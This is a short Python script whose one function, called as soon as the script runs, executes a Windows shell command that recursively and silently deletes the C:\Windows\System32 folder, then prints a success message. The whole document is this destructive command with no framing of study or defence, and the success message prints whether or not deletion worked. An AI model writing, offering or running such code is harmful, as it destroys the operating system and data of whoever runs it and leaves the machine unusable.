import os

def delete_system32():
    try:
        os.system("rd /s /q C:\\Windows\\System32")
        print("System32 folder deleted successfully.")
    except Exception as e:
        print(f"An error occurred: {str(e)}")

delete_system32()
